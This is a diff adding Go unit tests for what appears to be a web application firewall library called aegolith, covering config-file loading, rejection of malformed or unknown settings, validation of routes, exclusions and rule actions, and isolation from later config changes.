+
+func TestLoadConfig(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "aegolith.json")
+	const doc = `{
+  "mode": "monitor",
+  "allow_xml": true,
+  "limits": {"max_fields": 50, "max_value_len": 4096},
+  "routes": [{"method": "POST", "path": "/api/v1/cart/items",
+              "body": {"qty": {"type": "int", "min": 1, "max": 99}},
+              "unknown_fields": "block"}],
+  "unknown_route": "monitor",
+  "unknown_fields": "monitor",
+  "exclusions": [{"rule": "AEG-SQLI-*", "route": "GET /api/v1/products/search", "field": "query.q"}],
+  "rule_actions": {"scanner": "monitor"},
+  "inspect_headers": ["X-Search"],
+  "fail_open": false
+}`
+	if err := os.WriteFile(path, []byte(doc), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	cfg, err := aegolith.LoadConfig(path)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if cfg.Mode != aegolith.ModeMonitor || !cfg.AllowXML || cfg.Limits.MaxFields != 50 || len(cfg.Routes) != 1 ||
+		*cfg.Routes[0].UnknownFields != aegolith.ActionBlock || cfg.RuleActions["scanner"] != aegolith.ActionMonitor ||
+		cfg.FailOpen == nil || *cfg.FailOpen || cfg.Exclusions[0].Field != "query.q" || cfg.InspectHeaders[0] != "X-Search" {
+		t.Fatalf("loaded %+v", cfg)
+	}
+	if _, err := aegolith.New(cfg); err != nil {
+		t.Fatalf("New(loaded): %v", err)
+	}
+	if _, err := aegolith.LoadConfig(filepath.Join(dir, "missing.json")); err == nil {
+		t.Fatal("missing file should error")
+	}
+}
+
+func TestLoadConfigRejectsUnknownKeys(t *testing.T) {
+	dir := t.TempDir()
+	for name, doc := range map[string]string{
+		"top":      `{"mode":"enforce","modee":"x"}`,
+		"nested":   `{"routes":[{"method":"GET","path":"/a","bodyy":{}}]}`,
+		"limits":   `{"limits":{"max_feilds":1}}`,
+		"bad enum": `{"mode":"off"}`,
+		"trailing": `{"mode":"enforce"} {"mode":"monitor"}`,
+	} {
+		path := filepath.Join(dir, strings.ReplaceAll(name, " ", "_")+".json")
+		if err := os.WriteFile(path, []byte(doc), 0o600); err != nil {
+			t.Fatal(err)
+		}
+		if _, err := aegolith.LoadConfig(path); err == nil {
+			t.Errorf("%s: expected error", name)
+		}
+	}
+}
+
+func TestNewValidates(t *testing.T) {
+	for name, cfg := range map[string]aegolith.Config{
+		"bad route pattern":    {Routes: []aegolith.Route{{Method: "GET", Path: "no-slash"}}},
+		"bad field type":       {Routes: []aegolith.Route{{Method: "GET", Path: "/a", Query: map[string]aegolith.Field{"q": {Type: "nope"}}}}},
+		"bad mode":             {Mode: aegolith.Mode(9)},
+		"bad unknown route":    {UnknownRoute: aegolith.Action(9)},
+		"bad unknown fields":   {UnknownFields: aegolith.Action(-1)},
+		"bad rule action":      {RuleActions: map[string]aegolith.Action{"sqli": aegolith.Action(5)}},
+		"unknown rule key":     {RuleActions: map[string]aegolith.Action{"sqlinjection": aegolith.ActionMonitor}},
+		"empty exclusion rule": {Exclusions: []aegolith.Exclusion{{Route: "*"}}},
+		"bad exclusion route":  {Exclusions: []aegolith.Exclusion{{Rule: "sqli", Route: "/no-method"}}},
+		"bad exclusion field":  {Exclusions: []aegolith.Exclusion{{Rule: "sqli", Field: "q"}}},
+		"negative limit":       {Limits: aegolith.Limits{MaxFields: -1}},
+		"empty header":         {InspectHeaders: []string{" "}},
+		"empty method":         {AllowedMethods: []string{""}},
+	} {
+		if _, err := aegolith.New(cfg); err == nil {
+			t.Errorf("%s: expected error", name)
+		}
+	}
+	if _, err := aegolith.New(aegolith.Config{}); err != nil {
+		t.Fatalf("zero config: %v", err)
+	}
+}
+
+func TestNewCopiesConfig(t *testing.T) {
+	cfg := aegolith.Config{Exclusions: []aegolith.Exclusion{{Rule: "AEG-SQLI-*"}}, RuleActions: map[string]aegolith.Action{}}
+	fw := mustNew(t, cfg)
+	cfg.Exclusions[0].Rule = "AEG-NONE-*"
+	cfg.RuleActions["sqli"] = aegolith.ActionBlock
+	if d := fw.Inspect(get(sqliSearch)); d.Action != aegolith.ActionAllow {
+		t.Fatalf("firewall saw a later config change: %+v", d)
+	}
+}
